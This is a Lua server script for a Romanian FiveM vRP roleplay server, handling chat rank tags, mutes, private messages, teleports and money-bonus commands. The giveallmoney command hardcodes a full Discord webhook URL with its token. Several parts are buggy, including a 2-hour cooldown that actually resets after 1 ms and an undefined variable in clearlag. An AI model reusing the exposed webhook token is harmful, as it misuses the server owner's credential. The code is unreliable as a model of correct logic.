local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")
local mutedPlayers  = {}
vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vrp","vRP_chatroles")
vRPsp = Proxy.getInterface("vRP_sponsor")
BMclient = Tunnel.getInterface("vRP_basic_menu","vRP_basic_menu")
vRPclient = Tunnel.getInterface("vRP","vRP_cleanup")


local chatdisabled = false

RegisterServerEvent('chat:init')
RegisterServerEvent('chat:addTemplate')
RegisterServerEvent('chat:addMessage')
RegisterServerEvent('chat:addSuggestion')
RegisterServerEvent('chat:removeSuggestion')
RegisterServerEvent('_chat:muitzaqmessageEntered')
RegisterServerEvent('chat:clear')
RegisterServerEvent('__cfx_internal:commandFallback')
RegisterServerEvent('chat:kickSpammer')
AddEventHandler('chat:kickSpammer', function()
	TriggerClientEvent('chatMessage', -1, "^1Anubis "..vRP.getPlayerName({source}).."^0 a primit kick pentru SPAM!")
	DropPlayer(source, 'Ai fost dat afara pentru SPAM!')
end)
AddEventHandler('_chat:muitzaqmessageEntered', function(author, color, message)
    if not message or not author then
        return
	end
	local user_id = vRP.getUserId({source})
	if user_id ~= nil then
		local user_id = vRP.getUserId({source})
		local player = vRP.getUserSource({user_id})
		local isVip = vRP.getUserVipRank({user_id})
		local time = os.date("%H:%M")
		local pName = vRP.getPlayerName({player})
		local factionrank = vRP.getFactionRank({user_id})
		local author = "["..user_id.."] "..author
		if mutedPlayers[user_id] then 
			return TriggerClientEvent('chatMessage',source,'^1Eroare ^0Nu poti vorbi, ai mute!')
		   end
		if user_id ~= nil then
            if chatdisabled and not vRP.isUserTrialHelper{user_id} then
                TriggerClientEvent('chatMessage', source, "Chat-ul este momentan dezactivat de catre un admin. Nu poti vorbi!")
            else
                TriggerEvent('chatMessage', source, author, message)
                if disabled then
                    if vRP.isUserAdmin({user_id}) then
                        tag = "STAFF |"
                        rgb = {255, 0, 0}
                        TriggerClientEvent('chatMessage', -1, tag.." " ..author, rgb, " " ..  message)
                    else
                        CancelEvent()
                        TriggerClientEvent('chatMessage', source, "^1Anubis ^0Chat-ul este momentan dezactivat de catre un admin. Nu poti vorbi!")
                    end
                    print(author.." » ".. message)
                    elseif not WasEventCanceled() and not disabled then
                        if vRP.isUserFondatorComunitate({user_id}) then
                            tag = "DM FOR DONATION"
                            rgb = {255,0,0}	
                        elseif vRP.isUserDeveloper({user_id}) then
                            tag = "Patron"
                            rgb = {255,0,0}
                        elseif vRP.isUserOwnership({user_id}) then
                            tag = "Comunity Manager"
                            rgb = {123,111,204}
                        elseif vRP.isUserJr({user_id}) then
                            tag = "Trusted Anubis"
                            rgb = {123,111,204}
                        elseif vRP.isUserFondator({user_id}) then
                            tag = "Manager Anubis"
                            rgb = {255,0,0}	
                        elseif vRP.isUserHardcoreReflect({user_id}) then
                            tag = "Fondator"
                            rgb = {60,179,113}
                        elseif vRP.isUserCoFondator({user_id}) then
                            tag = "Co Fondator"
                            rgb = {60,179,113}
                        elseif vRP.isUserHeadofStaff({user_id}) then
                            tag = "Head of Staff"
                            rgb = {202, 0, 255}
                        elseif vRP.isUserSupervizor({user_id}) then
                            tag = "Supervizor"
                            rgb = {128, 80, 215}
                        elseif vRP.isUserSuperAdministrator({user_id}) then
                            tag = "Super Adminstrator"
                            rgb = {255,120,0}
                        elseif vRP.isUserAdministrator({user_id}) then
                            tag = "Administrator"
                            rgb = {250,183,0}
                        elseif vRP.isUserSuperModerator({user_id}) then
                            tag = "Super Moderator"
                            rgb = {255,219,0}
                        elseif vRP.isUserModerator({user_id}) then	
                            tag = "Moderator"
                            rgb = {0,61,255}
                        elseif vRP.isUserHelperAvansat({user_id}) then	
                            tag = "Helper Avansat"
                            rgb = {19,129,255}
                        elseif vRP.isUserHelper({user_id}) then	
                            tag = "Helper"
                            rgb = {68,255,159}
                        elseif vRP.isUserTrialHelper({user_id}) then	
                            tag = "Trial Helper"
                            rgb = {150,75,255}
                        elseif vRP.hasGroup({user_id, "youtuber"}) then
                            tag = "Youtuber"
                            rgb = {255,102,102}
                        elseif (isVip == 5) then
                            tag = "VIP Emerald"
                            rgb = {255,0,0}
                        elseif (isVip == 4) then
                            tag = "VIP Diamond"
                            rgb = {0,182,255}
                        elseif (isVip == 3) then
                            tag = "VIP Gold"
                            rgb = {255,216,0}
                        elseif (isVip == 2) then
                            tag = "VIP Silver"
                            rgb = {120,120,120}
                        elseif (isVip == 1) then
                            tag = "VIP Bronze"
                            rgb = {202,143,7}
                        elseif vRP.isUserSponsor({user_id}) then	
                            tag = "Sponsor"
                            rgb = {255,171,51}
                        elseif vRP.isUserInFaction({user_id,"Politie"}) then
                            tag = "Politia Romana"
                            rgb = {0, 45, 255}
                        elseif vRP.isUserInFaction({user_id,"Diicot"}) then
                            tag = "D.I.I.C.O.T"
                            rgb = {0, 45, 255}
                        elseif vRP.isUserInFaction({user_id,"Smurd"}) then
                            tag = "Medic"
                            rgb = {255,110,0}
                        elseif(vRP.hasUserFaction({user_id, "user"})) then
                            tag = "Civil"
                            rgb = {0,163,255}
                        else
                            tag = "Civil"
                            rgb = {0,163,255}
                        end
                        if not vRP.isUserTrialHelper{user_id} and not vRP.hasUserFaction{user_id} then 
                            tag = "Civil"
                            rgb = {0,163,255}
                        end
                        if vRP.hasUserFaction({user_id}) then
                            local faction = vRP.getUserFaction({user_id})
                            TriggerClientEvent('chatMessage', -1, "["..tag.."] "..author, rgb, " " ..  message)
                        else
                            TriggerClientEvent('chatMessage', -1, "["..tag.."] "..author, rgb, " " ..  message)
                        end
                    print(author.." » ".. message)
                end
            end
		end
	end
end)
AddEventHandler('__cfx_internal:commandFallback', function(command)
    local name = vRP.getPlayerName({source})
    TriggerEvent('chatMessage', source, name, '/' .. command)
    if not WasEventCanceled() then
		local user_id = vRP.getUserId({source})
		local player = vRP.getUserSource({user_id})
		local pName = vRP.getPlayerName({player})
		local author = "["..user_id.."] "..name
		message = "/"..command
    end
    CancelEvent()
end)
RegisterCommand('clearlag', function(source, args)
    local user_id = vRP.getUserId({player})
    if(source == 0 or user_id == 1 or user_id == 2) then
        local peds = GetAllPeds()
        local objs = GetAllObjects()
        for k,v in pairs(peds) do if DoesEntityExist(v) then DeleteEntity(v) end; end
        for k,v in pairs(objs) do if DoesEntityExist(v) then DeleteEntity(v) end; end
    else
        TriggerClientEvent("chatMessage", source, "^1Anubis ^0Nu ai acces la aceasta comanda!")
    end
end)
RegisterCommand('say', function(source, args, rawCommand)
	local time = os.date("%H:%M")
	if(source == 0)then
		TriggerClientEvent('chatMessage', -1, "[CONSOLA]", {255, 22, 22}, rawCommand:sub(5))
	else
		TriggerClientEvent("chatMessage", source, "^1Anubis ^0Nu ai acces la comanda /say!")
	end
end)
RegisterCommand("noclip", function(player)
    local user_id = vRP.getUserId({player})
	if vRP.isUserSuperModerator({user_id}) then
        vRPclient.toggleNoclip(player, {})
    else
        TriggerClientEvent("chatMessage", player, "^1Eroare: ^0Nu ai acces la aceasta comanda!")
    end
end)
RegisterCommand('addAdmin', function(source, args)
    if source == 0 then
        if not args[1] or not args[2] then print('/addAdmin <id> <level>') end;
        vRP.setUserAdminLevel{tonumber(args[1]), tonumber(args[2])};
    else
        local user_id = vRP.getUserId{source};
        if user_id == 1 then
            vRP.setUserAdminLevel{tonumber(args[1]), tonumber(args[2])};
        else;
            vRPclient.notify(source, {"Nu ai acces la aceasta comanda!"});
        end;
    end
end)
local deleteEveryVehicle = function()
  if not stopCleanup then 
  TriggerClientEvent('chatMessage',-1,'Toate masinile neocupate au fost sterse cu succes!')
    local vehs = GetAllVehicles()
      for k,v in pairs(vehs) do 
          if DoesEntityExist(v) then
        if GetPedInVehicleSeat(v,-1) == 0 then 
          DeleteEntity(v) 
        end
      end;
      end
  end
end
RegisterCommand('stats', function(source, args)
    local user_id = vRP.getUserId({source})
    local player = vRP.getUserSource({user_id})
    local banicash = vRP.getMoney({user_id})
    local nume = GetPlayerName(player)
    local banibanca = vRP.getBankMoney({user_id})
    local orejucate = vRP.getUserHoursPlayed({user_id})
    local coins = vRP.getGiftpoints({user_id})
	local coinsdonation = vRP.getdonationCoins({user_id})
	local VIP = vRP.getUserVipRank({user_id})
    local sponsor = "No"
    if vRP.isUserSponsors{user_id} then sponsor = "Da" else sponsor = "Nu" end
    local locdemunca = vRP.getUserFaction({user_id})
	local rows = exports.oxmysql:executeSync("SELECT warns FROM vrp_users WHERE id = @user_id", {user_id = user_id})
	warns = rows[1].warns
    CancelEvent()
		TriggerClientEvent('chatMessage', player, "--------------------------------------------------------------------")
        TriggerClientEvent('chatMessage', player, "^0Nume: ^1"..nume.."^0 || ID: ^1"..user_id.."^0 || VIP: ^1"..VIP.."^0 || Sponsor: ^1"..sponsor.."^0")
        TriggerClientEvent('chatMessage', player, "^0Factiune: ^1"..locdemunca.."^0 || Ore jucate: ^1"..orejucate.."^0 || GiftPoints: ^1"..vRP.formatMoney({coins}))
		TriggerClientEvent('chatMessage', player, "Diamante: ^1"..vRP.formatMoney({coinsdonation}))
		TriggerClientEvent('chatMessage', player, "--------------------------------------------------------------------")
end)
RegisterCommand('ore', function(source, args)
    local user_id = vRP.getUserId({source})
    local player = vRP.getUserSource({user_id})
    local orejucate = vRP.getUserHoursPlayed({user_id})
    CancelEvent()
		TriggerClientEvent('chatMessage', player, "^2Anubis ^0Ai ^4".. orejucate .." ^0ore jucate pe ^2Anubis Romania!^0")
		vRPclient.notify(source, {"Info: ~w~Ai ~r~".. orejucate .." ~w~ore jucate!"})
end)

RegisterCommand("nc", function(player)
    local user_id = vRP.getUserId({player})
	if vRP.isUserSuperModerator({user_id}) then
        vRPclient.toggleNoclip(player, {})
    else
        TriggerClientEvent("chatMessage", player, "^1Eroare: ^0Nu ai acces la aceasta comanda!")
    end
end)
RegisterCommand("respawn", function(player, args)
    local user_id = vRP.getUserId({player})
    if vRP.isUserTrialHelper({user_id}) then
        local target_id = parseInt(args[1])
        local target_src = vRP.getUserSource({target_id})
        if target_src then
            vRPclient.varyHealth(target_src,{100})
            vRP.varyHunger({target_src,-100})
            vRP.varyThirst({target_src,-100})
			vRPclient.teleport(target_src, {-539.525390625,-213.68591308594,37.649787902832})
			local users = vRP.getUsers({})
			for uID, ply in pairs(users) do
				if vRP.isUserHelper({uID}) then
					TriggerClientEvent('chatMessage', ply,"^1Anubis ^0Admin-ul ^1"..vRP.getPlayerName({player}).."^0 i-a dat respawn lui ^0[^1"..target_id.."^0]")
				end
			end
			vRPclient.notify(target_src, {"Succes: ~w~Admin-ul ~r~"..vRP.getPlayerName({player}).." ~w~ti-a dat respawn."})
        end
    end
end, false)
RegisterCommand("gotoevent", function(player)
    if eventOn then
        vRPclient.teleport(player, {evCoords[1], evCoords[2], evCoords[3]})
        TriggerClientEvent("zedutz:setFreeze", player, true)
    else
        TriggerClientEvent("chatMessage", player, "^1Eroare: ^0Nu exista nici un eveniment activ!")
    end
end, false)
RegisterCommand('veh', function(player)
	local user_id = vRP.getUserId({player})
	if vRP.isUserHeadofStaff({user_id}) then
	vRP.prompt({player,"Model Vehicul:","",function(player,model)
		if model ~= nil and model ~= "" then
			BMclient.spawnVehicle(player,{model})
			vRP.sendStaffMessage({"^1Staff: ^0Admin-ul ^1".. vRP.getPlayerName({player}) .." ^0a spawnat modelul ^1".. model .."^0"})
	  	else
			vRPclient.notify(player,{"Eroare: ~w~Trebuie sa pui un model de vehicul!"})
		end
	end})
end
end)
RegisterCommand('scuter', function(player)
	local user_id = vRP.getUserId({player})
	if vRP.isUserTrialHelper({user_id}) then
		BMclient.spawnVehicle(player,{"faggio"})
		vRP.sendStaffMessage({"^0Admin-ul ^2".. vRP.getPlayerName({player}) .." ^0a spawnat o ^4masina!"})
	else
		TriggerClientEvent("chatMessage", player, "^1Eroare: ^0Nu ai acces la aceasta comanda!")
	end
end)
RegisterCommand("stopevent", function(player)
    local user_id = vRP.getUserId({player})
    if vRP.isUserAdministrator({user_id}) then
        if eventOn then
            evCoords = {}
            eventOn = false
            TriggerClientEvent("chatMessage", -1, "^2Event: ^0Event-ul a fost oprit!")
            vRPclient.eventAnnouncement2(-1, {"~r~Eveniment-ul ~w~a fost oprit, te asteptam si data viitoare!"})
        else
            TriggerClientEvent("chatMessage", player, "^1Eroare: ^0Nu exista nici un eveniment activ!")
        end
    else
        TriggerClientEvent("chatMessage", player, "^1Eroare: ^0Nu ai acces la aceasta comanda!")
    end
end, false)
local function sendMsgToStaff(msg, user_id, staffOnline)
    local task = Task(staffOnline)
    local staffs = 0
    local users = vRP.getUsers({})
    for uID, ply in pairs(users) do
        if vRP.isUserTrialHelper({user_id}) then
            TriggerClientEvent("chatMessage", ply, "^1Intrebare ^0("..user_id.."): "..msg)
            vRPclient.playSound(ply, {"HUD_MINI_GAME_SOUNDSET","5_SEC_WARNING"})
            staffs = staffs + 1
        end
    end
    task({staffs})
end
local function getNrCifre(n)
    local cifs = 0
    while n ~= 0 do
        cifs = cifs + 1
        n = math.floor(n / 10)
    end
    return cifs
end
local questions = {}
local function autoDecremet(user_id)
    if questions[user_id] > 0 then
        questions[user_id] = questions[user_id] - 1
        Wait(1000)
        autoDecremet(user_id)
    else
        if questions[user_id] ~= -29 then
            TriggerClientEvent("chatMessage", vRP.getUserSource({user_id}), "^1Din pacate, nimeni nu ti-a raspuns la intrebare!")
        end
        questions[user_id] = nil
    end
end
RegisterCommand("n", function(player, args, msg)
    local user_id = vRP.getUserId({player})
    if user_id then
        if not questions[user_id] then
            local question = msg:sub(3)
            if msg:len() > 5 then
                sendMsgToStaff(question, user_id, function(staffOnline)
                    if staffOnline then
                        TriggerClientEvent("chatMessage", player, "^1Intrebarea ^0ta a fost adresata unui ^1membru STAFF!")
                        questions[user_id] = 60
                        autoDecremet(user_id)
                    else
                        TriggerClientEvent("chatMessage", player, "^1Eroare^0: Nici un membru STAFF nu este online!")
                    end
                end)
            else
                TriggerClientEvent("chatMessage", player, "^1Anubis ^0/n <intrebare>")
            end
        else
            TriggerClientEvent("chatMessage", player, "^1Eroare^0: Ai pus deja o intrebare, asteapta ^1"..questions[user_id].." ^0secunde!")
        end
    end
end)
RegisterCommand("nr", function(player, args, msg)
    local user_id = vRP.getUserId({player})
    local target_id = parseInt(args[1])
    local response = msg:sub(4 + getNrCifre(target_id))
    if user_id then
        if vRP.isUserTrialHelper({user_id}) then
            if target_id and response:len() > 0 then
                local target_source = vRP.getUserSource({target_id})
                if target_source then
                    if questions[target_id] then
                        TriggerClientEvent("chatMessage", target_source, "^1".. GetPlayerName(player) .. " ^0ti-a raspuns la intrebare!")
                        TriggerClientEvent("chatMessage", target_source, "^1Raspuns: ^0"..response)
                        local users = vRP.getUsers({})
                        for uID, ply in pairs(users) do
							if vRP.isUserTrialHelper({user_id}) then
                            end
                        end
                        questions[target_id] = -29
                    else
                        TriggerClientEvent("chatMessage", player, "^1Eroare^0: Acel jucator nu are o intrebare!")
                    end
                else
                    TriggerClientEvent("chatMessage", player, "^1Eroare^0: Acel jucator nu mai este conectat!")
                end
            else
                TriggerClientEvent("chatMessage", player, "^1Anubis ^0/nr <user_id> <raspuns>")
            end
        else
            TriggerClientEvent("chatMessage", player, "^1Eroare^0: Nu ai acces la aceasta comanda!")
        end
    end
end)
local lastSMS = {}
RegisterCommand("pm", function (player, args, rawCommand)
    local user_id = vRP.getUserId({player})
    if user_id ~= nil then
        local nuser_id = tonumber(args[1])
        local msg = rawCommand
        if nuser_id then
            local nplayer = vRP.getUserSource({nuser_id})
            if nplayer then
                if msg:sub(3) ~= nil and msg:sub(3) ~= "" then
                    msg = msg:gsub(msg:sub(1, 3)..nuser_id.." ","")
                    TriggerClientEvent("chatMessage",nplayer,"^0Mesaj de la ^2(^0"..user_id.."^2) ^0"..GetPlayerName(player)..": ^4".. msg)
                    TriggerClientEvent("chatMessage",player,"^0Mesaj catre ^2(^0"..nuser_id.."^2) ^0"..GetPlayerName(nplayer)..": ^4".. msg)
                    TriggerClientEvent("InteractSound_CL:PlayOnOne", nplayer, "trimismesaj", 0.05)
                    lastSMS[nuser_id] = user_id
                    lastSMS[user_id] = nuser_id
                else
                    vRPclient.notify(player,{'Eroare: ~w~Mesaj invalid!'})
                end
            else
                vRPclient.notify(player,{"Eroare: ~r~Acest jucator nu este conectat pe server!"})
            end
        else
            TriggerClientEvent("chatMessage",player,"^1Eroare: ^0/pm <user_id> <mesaj>")
        end
    end
end)
RegisterCommand("r", function (player, args, rawCommand)
    local user_id = vRP.getUserId({player})
    if user_id ~= nil then
        local msg = rawCommand
        if lastSMS[user_id] then
            local nuser_id = tonumber(lastSMS[user_id])
            local nplayer = vRP.getUserSource({nuser_id})
            if(args[1] == nil)then
                TriggerClientEvent("chatMessage",player,"^1Eroare:^0 /r <mesaj>")
            else
                if nplayer then
                    if msg:sub(3) ~= nil and msg:sub(3) ~= "" then
                        msg = msg:gsub(msg:sub(1, 2),"")
                        TriggerClientEvent("chatMessage",nplayer,"^0Mesaj de la ^1(^0"..user_id.."^1) ^0"..GetPlayerName(player)..": ^1".. msg )
                        TriggerClientEvent("chatMessage",player,"^0Mesaj catre ^1(^0"..nuser_id.."^1) ^0"..GetPlayerName(nplayer)..": ^1".. msg )
                        TriggerClientEvent("InteractSound_CL:PlayOnOne", nplayer, "trimismesaj", 0.05)
                        lastSMS[nuser_id] = user_id
                        lastSMS[user_id] = nuser_id
                    else
                        vRPclient.notify(player,{'Eroare: ~w~Mesaj invalid!'})
                    end
                else
                    vRPclient.notify(player,{"Eroare: ~r~Nu ai cui sa-i raspunzi!"})
                end
            end
        else
            vRPclient.notify(player,{"Eroare: ~r~Nu ai cui sa-i raspunzi!"})
        end
    end
end)
RegisterCommand("ara", function(source,args)
    local user_id = vRP.getUserId({source})
    local src = vRP.getUserSource({user_id})
    local radius = tonumber(args[1])
    radius = radius or 10
    if not ( radius >= 1 and radius <= 10000) then 
        return TriggerClientEvent('chatMessage',player,'^1Eroare^0: Numarul de metri este invalid!')
    end
    local name = GetPlayerName(src)
    if vRP.isUserTrialHelper({user_id}) then 
            vRPclient.varyHealth(source,{100})
            vRPclient.getNearestPlayers(src,{tonumber(radius)}, function(nplayers)
                for k,v in pairs(nplayers) do 
                    vRPclient.varyHealth(k,{100})
					vRPclient.notify(k,{"Succes: ~w~Ai primit revive de la admin-ul ~r~" .. name})
                end
            end)
			vRP.sendStaffMessage({"^2Anubis ^0Admin-ul ^4" .. name ..  " ^0a dat revive pe o raza de ^2" .. radius .. "m!"})
        else
			vRPclient.notify(src,{"Eroare: ~w~Nu ai acces la aceasta comanda!"})
		end
end)
 
RegisterCommand("startevent", function(player)
    local user_id = vRP.getUserId({player})
    if vRP.isUserAdministrator({user_id}) then
        if not eventOn then
            vRPclient.getPosition(player, {}, function(x, y, z)
                evCoords = {x, y, z + 0.5}
            end)
            eventOn = true
            TriggerClientEvent("chatMessage", -1, "^2Anubis ^0Admin-ul ^4"..vRP.getPlayerName({player}).." ^0a pornit un eveniment!")
			TriggerClientEvent("chatMessage", -1, "^2Anubis ^0Foloseste ^4/gotoevent ^0pentru a te teleporta acolo.")
			vRPclient.eventAnnouncement(-1, {"~w~Foloseste ~g~/gotoevent ~w~pentru a te teleporta la eveniment"})
        end
    else
        TriggerClientEvent("chatMessage", player, "^1Eroare: ^0Nu ai acces la aceasta comanda!")
    end
end, false)

RegisterCommand('clear', function(source)
    local user_id = vRP.getUserId({source});
    if user_id ~= nil then
        if vRP.isUserModerator({user_id}) then
            TriggerClientEvent("chat:clear", -1);
            TriggerClientEvent("chatMessage", -1, "^2Anubis ^0Admin-ul ^4".. vRP.getPlayerName({source}) .."^0 a curatat chat-ul!");
        else
            TriggerClientEvent("chatMessage", source, "^1Eroare^0: Nu ai acces la aceasta comanda!");
        end
    end
end)
local function giveAllBankMoney(amount, sphynx)  
    local users = vRP.getUsers({})
    for user_id, source in pairs(users) do
        if not sphynx then
			vRP.giveBankMoney({user_id, tonumber(amount)})
		end
    end
end
local function giveGiftpoints(amount, sphynx)  
    local users = vRP.getUsers({})
    for user_id, source in pairs(users) do
        if not sphynx then
			vRP.givedonationCoins({user_id, tonumber(amount)})
		end
    end
end
local cooldown = {}
RegisterCommand("giveallmoney", function(player, args)
    if player == 0 then
        local theMoney = parseInt(args[1]) or 0
		if theMoney > 1 and theMoney < 100000000 then
            giveAllBankMoney(theMoney, false)
			vRPclient.bonusAnnouncement(-1, {"~p~Serverul ~w~a oferit tuturor jucatorilor suma de ~p~"..vRP.formatMoney({theMoney}).."$!"})
            TriggerClientEvent("chatMessage", -1, "^9Bonus: ^0Serverul a oferit tuturor cetatenilor suma de ^3"..vRP.formatMoney({theMoney}).."$!")
            local embed = {
                {
                    ["color"] = "15158332",
                    ["type"] = "rich",
                    ["title"] = "Logs GiveMoney",
                   
                    ["description"] = "** Consola a oferit tuturor un bonus de "..vRP.formatMoney({theMoney}).."$**",
                    ["footer"] = {
                    ["text"] = "Made by Edy"
                    }
                }
              }
   
            PerformHttpRequest('https://discord.com/api/webhooks/1321589215502405632/PDRC_D_exXXmeBHpKcEtfctUhFNH0yWxzgqQIzwaxJKMkZLWrJt23TXi9PegYll_Z1bo', function(err, text, headers) end, 'POST', json.encode({embeds = embed}), { ['Content-Type'] = 'application/json' }) 
        else
            print("/giveallmoney <suma>")
	end
    else
        local user_id = vRP.getUserId({player})
        if vRP.isUserFondatorComunitate({user_id}) then
            local theMoney = parseInt(args[1]) or 0
			if cooldown[user_id] == nil then
			if theMoney > 1 and theMoney < 100000000 then
                giveAllBankMoney(theMoney, false)
				vRPclient.bonusAnnouncement(-1, {"Admin-ul ~p~"..vRP.getPlayerName({player}).." ~w~a oferit tuturor jucatorilor  suma de ~p~"..vRP.formatMoney({theMoney}).."$!"})
				TriggerClientEvent("chatMessage", -1, "^9Bonus: ^0Fondatorul ^3"..vRP.getPlayerName({player}).."^0 a oferit tuturor jucatorilor suma de ^3"..vRP.formatMoney({theMoney}).."$!")
                local embed = {
                    {
                        ["color"] = "15158332",
                        ["type"] = "rich",
                        ["title"] = "Logs GiveMoney",
                       
                        ["description"] = "Admin-ul ~p~"..vRP.getPlayerName({player}).." ~w~a oferit tuturor jucatorilor  suma de ~p~"..vRP.formatMoney({theMoney}).."$!",
                        ["footer"] = {
                        ["text"] = "Made by Edy"
                        }
                    }
                  }
                
                PerformHttpRequest('https://discord.com/api/webhooks/1321589215502405632/PDRC_D_exXXmeBHpKcEtfctUhFNH0yWxzgqQIzwaxJKMkZLWrJt23TXi9PegYll_Z1bo', function(err, text, headers) end, 'POST', json.encode({embeds = embed}), { ['Content-Type'] = 'application/json' }) 
				cooldown[user_id] = true
				SetTimeout(1,function()
					cooldown[user_id] = nil
				end)
            else
				TriggerClientEvent("chatMessage", player, "^1Eroare^0: Maxim 100.000.000 $!")
            end
        else
			TriggerClientEvent("chatMessage", player, "^1Eroare^0: Ai cooldown la aceasta comanda 2 ore!")
        end
	else
		TriggerClientEvent("chatMessage", player, "^1Eroare^0: Nu ai acces la aceasta comanda!")
    end
end
end, false)


local cooldown = {}
RegisterCommand("giveallrp", function(player, args)
    if player == 0 then
        local giftpoints = parseInt(args[1]) or 0
		if giftpoints > 1 and giftpoints < 50 then
            giveGiftpoints(giftpoints, false)
            TriggerClientEvent("chatMessage", -1, "^9Bonus: ^0Serverul ^0a oferit tuturor cetatenilor ^3"..vRP.formatMoney({giftpoints}).." Anubis Points!")
			vRPclient.bonusAnnouncement2(-1, {"~r~Serverul ~w~a oferit tuturor jucatorilor ~r~"..vRP.formatMoney({giftpoints}).." Anubis Points!"})
        else
            print("/giveallgiftpoints <suma>")
        end
    else
        local user_id = vRP.getUserId({player})
        if vRP.isUserFondatorComunitate({user_id}) then
            local giftpoints = parseInt(args[1]) or 0
			if cooldown[user_id] == nil then
            if giftpoints > 1 and giftpoints < 50 then
                giveGiftpoints(giftpoints, false)
				TriggerClientEvent("chatMessage", -1, "^9Anubis points Bonus: ^0Fondatorul ^3"..vRP.getPlayerName({player}).."^0 a oferit tuturor jucatorilor ^3"..vRP.formatMoney({giftpoints}).." Anubis Points!")
				vRPclient.bonusAnnouncement2(-1, {"Admin-ul ~r~"..vRP.getPlayerName({player}).." ~w~a oferit tuturor jucatorilor ~r~"..vRP.formatMoney({giftpoints}).." Anubis Points!"})
				cooldown[user_id] = true
				SetTimeout(7200000,function()
					cooldown[user_id] = nil
				end)
            else
				TriggerClientEvent("chatMessage", player, "^1Eroare^0: Aceasta suma nu este o suma permisa!")
            end
        else
			TriggerClientEvent("chatMessage", player, "^1Eroare^0: Ai cooldown la aceasta comanda 2 ore!")
        end
	else
		TriggerClientEvent("chatMessage", player, "^1Eroare^0: Nu ai acces la aceasta comanda!")
    end
end
end, false)
RegisterCommand('a', function(source, args, rawCommand)
	local user_id = vRP.getUserId({source})
	local theTarget = vRP.getUserSource({user_id})
	if user_id ~= nil then
		if(args[1] == nil)then
			TriggerClientEvent('chatMessage', source, "^1Eroare: ^0/"..rawCommand.." <mesaj>")
		else
			if(vRP.isUserTrialHelper({user_id}))then
				local users = vRP.getUsers({})
				for uID, ply in pairs(users) do
					if vRP.isUserTrialHelper({uID}) then
						TriggerClientEvent('chatMessage', ply, "^0[^1Staff Chat^0] [^1"..user_id.."^0] "..vRP.getPlayerName({source}).." » ^1" ..rawCommand:sub(2))
					end
				end
			end
		end
	end    
end)
RegisterCommand('h', function(source, args, rawCommand)
	local user_id = vRP.getUserId({source})
	local time = os.date("%H:%M")
	if user_id ~= nil then
		if(args[1] == nil)then
			TriggerClientEvent('chatMessage', source, "^1Eroare: ^0/"..rawCommand.." <mesaj>") 
		else
			if(vRP.isUserSuperAdministrator({user_id}))then
				local users = vRP.getUsers({})
				for uID, ply in pairs(users) do
					if vRP.isUserSuperAdministrator({uID}) then
						TriggerClientEvent('chatMessage', ply, "[^9High ^0Staff^3] ^0"..vRP.getPlayerName({source}).." (^3"..user_id.."^0): " ..rawCommand:sub(2))
					end
				end
			end
		end
	end    
end)

RegisterCommand('unmute', function(source,args)
	local player = tonumber(source)
	local user_id = vRP.getUserId({player})
	if not vRP.isUserTrialHelper({user_id}) then return end;
	local id = tonumber(args[1])
	if not vRP.isConnected({id}) then return TriggerClientEvent('chatMessage',player,'^1Eroare: ^0Jucatorul nu este online!') end;
	local src = vRP.getUserSource({id})
	TriggerClientEvent('chatMessage', -1, "^2Anubis ^4"..GetPlayerName(src).." ^0a primit unmute de la ^1"..GetPlayerName(player))
	mutedPlayers[id] = nil
  end)
  RegisterCommand('mute', function(source,args)
	local player = tonumber(source)
	local user_id = vRP.getUserId({player})
	if not vRP.isUserTrialHelper({user_id}) then return end;
	local id = tonumber(args[1])
	if not vRP.isConnected({id}) then return TriggerClientEvent('chatMessage',player,'^1Eroare: ^0Jucatorul nu este online!') end;
	local mins = tonumber(args[2])
	local reason = tostring(args[3]) or "Necunoscut"
	if mins <= 0 or mins >= 1000 then 
	  return TriggerClientEvent('chatMessage',player,'^1Eroare: ^0Numar invalid!')
	end
	local src = vRP.getUserSource({id})
	TriggerClientEvent('chatMessage', -1, "^2Anubis ^4"..GetPlayerName(src).." ^0a primit mute ^2"..mins.." ^0minute de la ^1"..GetPlayerName(player))
	TriggerClientEvent('chatMessage', -1, "^2Motiv: ^0"..reason)
	mutedPlayers[id] = mins
	Citizen.SetTimeout(1000 * 60 * mins, function() mutedPlayers[id] = nil end)
  end)
RegisterCommand("aa2",function( source )
    if vRP.isUserTrialHelper({vRP.getUserId({source})}) then
        vRPclient.teleport(source,{-899.92779541016,-455.46737670898,126.53438568115})
		vRPclient.notify(source, {"Succes: Te-ai teleportat la casa ~b~adminilor."})
    end
end)
RegisterCommand("serverdiscord",function( source )
		TriggerClientEvent('chatMessage', source, "Discord-ul serverului este ^3discord.gg/Anubisro")
end)
RegisterCommand("tptome", function(player, args)
	local user_id = vRP.getUserId({player})
	if vRP.isUserTrialHelper({user_id}) then
		if args[1] and args[1] ~= "" then
			local target_id = parseInt(args[1])
			local numestaff = vRP.getPlayerName({player})
			local target_src = vRP.getUserSource({target_id})
			if target_src then
                if target_id == 1 or target_id == 2 or target_id == 2349 then return TriggerClientEvent("chatMessage", player, "Nu ai voie sa te teleportezi la aceste id uri !") end
				vRPclient.getPosition(player, {}, function(x, y, z)
					vRPclient.teleport(target_src, {x, y, z})
					vRPclient.notify(player, {"Succes: ~w~L-ai teleportat la tine pe "..vRP.getPlayerName({target_src}).." ("..target_id..")"})
					vRPclient.notify(target_src, {"Info: ~w~Ai fost teleportat de catre ~r~"..vRP.getPlayerName({player}).." ("..user_id..")"})
					vRP.sendStaffMessage({"^1Staff: ^0Admin-ul ^1".. numestaff .." ^0a dat tptome lui ^1".. target_id})
				end)
			else
				TriggerClientEvent("chatMessage", player, "^1Eroare^0: Jucatorul nu este conectat!")
			end
		else
			TriggerClientEvent("chatMessage", player, "^1Eroare^0: /tptome <user_id>")
		end
	else
		TriggerClientEvent("chatMessage", player, "^1Eroare^0: Nu ai acces la aceasta comanda!")
	end
end, false)
RegisterCommand("tpto", function(player, args)
	local user_id = vRP.getUserId({player})
	if vRP.isUserTrialHelper({user_id}) then
		if args[1] and args[1] ~= "" then
			local target_id = parseInt(args[1])
			local numestaff = vRP.getPlayerName({player})
			local target_src = vRP.getUserSource({target_id})
			if target_src then
                if target_id == 1 or target_id == 2 then return TriggerClientEvent("chatMessage", player, "Nu ai voie sa te teleportezi la aceste id uri !") end
				vRPclient.getPosition(target_src, {}, function(x, y, z)
					vRPclient.teleport(player, {x, y, z})
					vRPclient.notify(player, {"Succes: ~w~Te-ai teleportat la "..vRP.getPlayerName({target_src}).." ("..target_id..")"})
